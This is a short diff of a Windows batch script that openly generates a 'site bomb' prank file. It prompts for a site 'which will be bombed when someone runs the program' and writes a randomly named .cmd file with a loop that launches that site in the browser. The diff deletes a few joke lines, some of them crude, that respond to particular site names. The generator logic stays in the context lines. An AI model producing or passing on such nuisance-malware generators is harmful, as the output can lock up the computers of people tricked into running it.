@@ -8,11 +8,6 @@ echo Enter The Site Which Will Be Bombed When Someone Runs The Program [example.
 echo The "&" Character Is Not Allowed
 set /P SITE="> "
 cls
-IF /I %SITE%==example.com echo Lol Why The Example
-IF /I %SITE%==google.com echo Why Google
-IF /I %SITE%==pornhub.com echo Its Just The Homepage Tho
-IF /I %SITE%==homo.xxx echo Bruhhhhh
-IF /I %SITE%==gaymaletube.com echo Bruhhhhhhhhhhhhhh
 echo @ECHO OFF>(%RAND%).cmd
 echo :LOOP>>(%RAND%).cmd
 echo start https://%SITE%>>(%RAND%).cmd
